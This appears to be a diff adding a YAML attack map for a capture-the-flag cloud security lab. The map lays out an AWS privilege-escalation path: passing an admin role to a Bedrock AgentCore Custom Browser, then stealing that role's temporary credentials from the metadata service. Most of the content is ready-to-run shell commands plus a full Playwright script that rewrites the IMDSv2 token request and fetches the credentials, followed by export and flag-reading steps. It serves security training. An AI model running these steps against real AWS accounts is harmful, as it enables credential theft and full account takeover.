@@ -1,0 +1,124 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-bedrock-006-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could have been
+        obtained through many real-world vectors: phishing a developer and gaining access to their
+        workstation, compromising a browser session, exploiting a vulnerable workload running in
+        this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded
+        in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole on the target admin role and the bedrock-agentcore
+        permissions needed to create a Custom Browser, start a browser session, and connect
+        via the Chrome DevTools Protocol automation stream. It cannot directly assume the target
+        role -- but it can provision a browser that runs with the role's credentials inside a
+        Firecracker MicroVM.
+
+    - id: custom-browser
+      label: "Custom Browser"
+      type: resource
+      subType: bedrock-agent
+      arn: "arn:aws:bedrock-agentcore:{region}:{account_id}:browser/atk_browser_bedrock_006"
+      description: >
+        The attacker-created AgentCore Custom Browser. This browser runs inside a Firecracker
+        MicroVM managed by AWS. When the browser is created with an IAM execution role, AWS assumes
+        that role on behalf of the browser and vends the resulting temporary credentials to processes
+        running inside the MicroVM via the MicroVM Metadata Service (MMDS) at 169.254.169.254.
+
+        Unlike AgentCore Runtimes and Harnesses, there is no InvokeAgentRuntimeCommand equivalent
+        for browsers. Instead, the attacker connects over the Chrome DevTools Protocol (CDP) using
+        Playwright and issues JavaScript fetch() calls from inside the browser's MicroVM to read the
+        execution role credentials from MMDS.
+
+    - id: target-role
+      label: "Target Admin Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-bedrock-006-to-admin-target-role"
+      description: >
+        The target IAM role with AdministratorAccess. This role trusts bedrock-agentcore.amazonaws.com
+        as a service principal, which means it can be passed to an AgentCore Custom Browser as its
+        execution role. AWS assumes this role when the browser is created, and the resulting temporary
+        credentials (AccessKeyId, SecretAccessKey, Token) are available at the MMDS endpoint inside
+        the browser's Firecracker MicroVM. With these credentials, the attacker has full administrative
+        access to the AWS account, including the ability to read the CTF flag from SSM Parameter Store.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/bedrock-006-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as an SSM parameter. Retrieving it requires
+        administrator-equivalent permissions in this account. Use the temporary credentials
+        extracted from MMDS via the CDP/Playwright session to call ssm:GetParameter and read
+        the flag value.
+
+  edges:
+    - from: starting-principal
+      to: custom-browser
+      label: "iam:PassRole + bedrock-agentcore:CreateBrowser"
+      description: >
+        Create a new AgentCore Custom Browser, passing the target admin role as the execution role.
+        The iam:PassRole permission authorizes this -- AWS validates it before accepting the
+        CreateBrowser API call. Once created, AWS assumes the execution role on behalf of the browser
+        and runs a Firecracker MicroVM with the role's temporary credentials served at MMDS.
+        The browser must reach READY state before a session can be started.
+      commands:
+        - description: "Retrieve the account ID and build the target role ARN"
+          command: "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && TARGET_ROLE_ARN=\"arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-bedrock-006-to-admin-target-role\""
+        - description: "Create the Custom Browser with the privileged execution role"
+          command: "BROWSER_RESPONSE=$(aws bedrock-agentcore-control create-browser --region us-east-1 --name atk_browser_bedrock_006 --execution-role-arn \"$TARGET_ROLE_ARN\" --network-configuration '{\"networkMode\":\"PUBLIC\"}' --output json) && BROWSER_ID=$(echo \"$BROWSER_RESPONSE\" | jq -r '.browserId') && echo \"Browser ID: $BROWSER_ID\""
+        - description: "Poll GetBrowser until the browser reaches READY state"
+          command: "while true; do STATUS=$(aws bedrock-agentcore-control get-browser --region us-east-1 --browser-id \"$BROWSER_ID\" --query 'status' --output text); echo \"Status: $STATUS\"; [ \"$STATUS\" = \"READY\" ] && break; sleep 15; done"
+      hints:
+        - "Create a new Custom Browser via bedrock-agentcore:CreateBrowser, specifying the target admin role as the executionRoleArn. AWS assumes that role when provisioning the browser's Firecracker MicroVM -- iam:PassRole is what authorizes you to specify a role you don't own. Poll GetBrowser until the status reaches READY before proceeding, as MicroVM initialization takes 2-5 minutes."
+        - "Once the browser is READY, start a session with bedrock-agentcore:StartBrowserSession to obtain a WebSocket URL, then use bedrock-agentcore:ConnectBrowserAutomationStream to get the CDP endpoint. Connect via Playwright's chromium.connect_over_cdp() to gain JavaScript execution inside the MicroVM. Because the MicroVM exposes IMDSv2 (which requires a PUT for the token endpoint), register a context.route() hook to intercept requests to http://169.254.169.254/latest/api/token and rewrite them as PUT requests with the X-aws-ec2-metadata-token-ttl-seconds header before the fetch() call is sent."
+        - "Browse to https://pathfinding.cloud/paths/bedrock-006 for technique details."
+
+    - from: custom-browser
+      to: target-role
+      label: "CDP/Playwright MMDS credential extraction"
+      description: >
+        Connect to the Custom Browser over CDP using Playwright. Register a context.route() hook
+        on http://169.254.169.254/** to intercept and rewrite the IMDSv2 token request (GET → PUT
+        with X-aws-ec2-metadata-token-ttl-seconds header). Use page.evaluate() to call fetch() from
+        inside the browser's MicroVM against the MMDS token endpoint, then use the returned token
+        to fetch temporary credentials for the execution role from
+        http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>.
+        Parse AccessKeyId, SecretAccessKey, and Token from the JSON response.
+      commands:
+        - description: "Start a browser session to obtain the CDP WebSocket URL"
+          command: "SESSION_RESPONSE=$(aws bedrock-agentcore start-browser-session --region us-east-1 --browser-identifier \"$BROWSER_ID\" --output json) && WS_URL=$(echo \"$SESSION_RESPONSE\" | jq -r '.streams.automationStream.streamEndpoint')"
+        - description: "Write the Playwright credential extraction script"
+          command: "cat > /tmp/extract_bedrock_006_creds.py << 'EOF'\nimport asyncio, json, sys\nfrom playwright.async_api import async_playwright\n\nTARGET_ROLE = sys.argv[1]\nWS_URL = sys.argv[2]\n\nasync def main():\n    async with async_playwright() as p:\n        browser = await p.chromium.connect_over_cdp(WS_URL)\n        ctx = browser.contexts[0]\n\n        # Intercept MMDS token request and rewrite as PUT with required header\n        async def rewrite_mmds_token(route):\n            if '/latest/api/token' in route.request.url:\n                await route.continue_(method='PUT', headers={**dict(route.request.headers), 'X-aws-ec2-metadata-token-ttl-seconds': '60'})\n            else:\n                await route.continue_()\n\n        await ctx.route('http://169.254.169.254/**', rewrite_mmds_token)\n        page = ctx.pages[0] if ctx.pages else await ctx.new_page()\n\n        # Fetch MMDS token\n        token = await page.evaluate('fetch(\"http://169.254.169.254/latest/api/token\").then(r=>r.text())')\n\n        # Fetch credentials using the token\n        creds_json = await page.evaluate(f'fetch(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/{TARGET_ROLE}\", {{headers:{{\"X-aws-ec2-metadata-token\":\"{token}\"}}}}). then(r=>r.json())')\n        print(json.dumps(creds_json))\n        await browser.close()\n\nasyncio.run(main())\nEOF"
+        - description: "Run the extraction script to retrieve MMDS credentials"
+          command: "TARGET_ROLE_SHORT=$(basename \"$TARGET_ROLE_ARN\") && CREDS=$(python3 /tmp/extract_bedrock_006_creds.py \"$TARGET_ROLE_SHORT\" \"$WS_URL\")"
+        - description: "Export the extracted credentials"
+          command: "export AWS_ACCESS_KEY_ID=$(echo \"$CREDS\" | jq -r '.AccessKeyId') && export AWS_SECRET_ACCESS_KEY=$(echo \"$CREDS\" | jq -r '.SecretAccessKey') && export AWS_SESSION_TOKEN=$(echo \"$CREDS\" | jq -r '.Token')"
+        - description: "Verify you are now operating as the admin role"
+          command: "aws sts get-caller-identity --query 'Arn' --output text"
+      hints: []
+
+    - from: target-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        Using the admin credentials extracted from MMDS via the CDP/Playwright session, read the
+        CTF flag from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all
+        parameters in the account, including the flag at /pathfinding-labs/flags/bedrock-006-to-admin.
+      commands:
+        - description: "Retrieve the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/bedrock-006-to-admin --query 'Parameter.Value' --output text"
+      hints:
+        - "You now hold admin-equivalent credentials. The flag is stored in a well-known AWS service for configuration and secrets."
+        - "Use ssm:GetParameter with the scenario-specific parameter name under the /pathfinding-labs/flags/ prefix to retrieve the flag."
